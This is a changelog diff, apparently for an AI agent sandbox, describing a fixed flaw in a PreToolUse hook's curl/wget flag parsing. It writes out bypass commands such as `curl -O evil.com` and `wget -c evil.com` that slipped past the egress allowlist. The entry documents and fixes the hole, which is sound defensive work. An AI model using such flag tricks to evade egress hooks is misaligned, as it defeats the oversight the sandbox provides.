@@ -16,13 +16,19 @@ CalVer image tags (`stable-YYYY.MM.N`, `dev-YYYY.MM.N`) are produced for every C
 
 ### Fixed
 
-- **Security (defense-in-depth):** the PreToolUse hook no longer treats
-  curl's `-O`/`--remote-name` (which takes no argument) as value-consuming,
-  which had let `curl -O evil.com` skip the request target and bypass the
-  hook's egress allowlist. (The VM-level `network.allow_out` policy from
+- **Security (defense-in-depth):** the PreToolUse hook's curl/wget
+  value-flag skip set is now per-tool, closing an egress-bypass class where a
+  short flag that consumes its next token in one tool takes no argument in the
+  other. A shared set had let the token after such a flag — potentially the
+  request target — go unchecked: `curl -O evil.com` (curl `-O`/`--remote-name`
+  takes no arg) and `wget -c/-b/-F/-E/-m evil.com` (wget `--continue`/
+  `--background`/`--force-html`/`--adjust-extension`/`--mirror`, all no-arg,
+  vs the value-taking curl letters) all slipped past the allowlist. The hook
+  now selects the value-flag set by the invoked tool and lists only flags that
+  take a value for that tool, so an omission over-blocks (safe) rather than
+  skipping a real target. (The VM-level `network.allow_out` policy from
   0.74.70 still blocked such egress on a configured deployment; this restores
-  the in-sandbox hook layer.) wget's unambiguous `--output-document` stays in
-  the skip set. Follow-up to #847.
+  the in-sandbox hook layer.) Follow-up to #847.
 
 ---
 
